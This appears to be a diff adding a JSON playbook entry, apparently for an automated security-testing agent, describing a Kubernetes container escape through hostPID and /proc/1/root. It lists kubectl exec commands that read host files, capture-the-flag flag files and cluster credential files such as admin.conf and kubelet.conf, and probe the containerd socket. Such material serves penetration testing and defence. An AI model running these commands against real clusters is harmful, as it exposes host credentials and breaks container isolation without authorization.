@@ -1,0 +1,49 @@
+[
+  {
+    "id": "k8s-hostpid-procfs",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "title": "K8s hostPID ProcFS Host Filesystem Access — /proc/1/root Host Read (K8S-23)",
+    "description": "When a pod runs with hostPID: true, it shares the host's PID namespace and can access the host filesystem through /proc/1/root (the root filesystem of PID 1 on the host). This technique works even when the pod is otherwise locked down (non-root user, no capabilities, restricted seccomp profile) — hostPID alone is sufficient for host filesystem read access. Attack: (1) Identify pods with hostPID: true: kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext — look for hostPID: true. (2) Even with runAsUser: 1000 and all capabilities dropped, access the host filesystem: kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/. (3) Read host files directly: kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt. (4) Enumerate host processes: kubectl exec -n monitor-ns monitor-pod -- ps aux. (5) Read host metadata and credentials: kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/etc/kubernetes/admin.conf. (6) Access container runtime socket via host: kubectl exec monitor-pod -- ls /proc/1/root/run/containerd/containerd.sock. Key insights: (a) hostPID:true shares the host PID namespace — /proc/1 is the host's init process. (b) /proc/1/root is a symbolic link to the host's root filesystem. (c) This works regardless of the container's runAsUser setting — file access is constrained by the host's file permissions, not container isolation. (d) Even read-only host filesystem access can leak kubeconfig files, ServiceAccount tokens, cloud credentials, and flag files. (e) If combined with a writable mount or container runtime socket, this becomes a full host escape.",
+    "techniques": [
+      "kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext",
+      "kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt",
+      "kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/",
+      "kubectl exec -n monitor-ns monitor-pod -- ps aux",
+      "kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/cmdline",
+      "kubectl exec -n monitor-ns monitor-pod -- find /proc/1/root -name 'flag*' 2>/dev/null",
+      "kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/etc/kubernetes/kubelet.conf",
+      "kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/run/containerd/"
+    ],
+    "indicators": [
+      "Pod spec has hostPID: true",
+      "Pod appears locked down (non-root, no caps) but has hostPID",
+      "Host flag files at known paths (/host-flag/, /flag.txt)",
+      "Host kubeconfig accessible at /etc/kubernetes/"
+    ],
+    "prerequisites": [
+      "kubectl exec access to pod with hostPID: true",
+      "Pod runs on target node (hostPID exposes host's /proc)",
+      "Host filesystem readable through /proc/1/root (file permissions permitting)"
+    ],
+    "tools": [
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "shell_exec",
+      "check_capabilities"
+    ],
+    "tags": [
+      "k8s",
+      "hostpid",
+      "procfs",
+      "proc-1-root",
+      "host-filesystem",
+      "escape",
+      "k8s-23",
+      "container-escape",
+      "seccomp-bypass"
+    ],
+    "confidence": 0.85,
+    "mitre_attack": "T1611"
+  }
+]
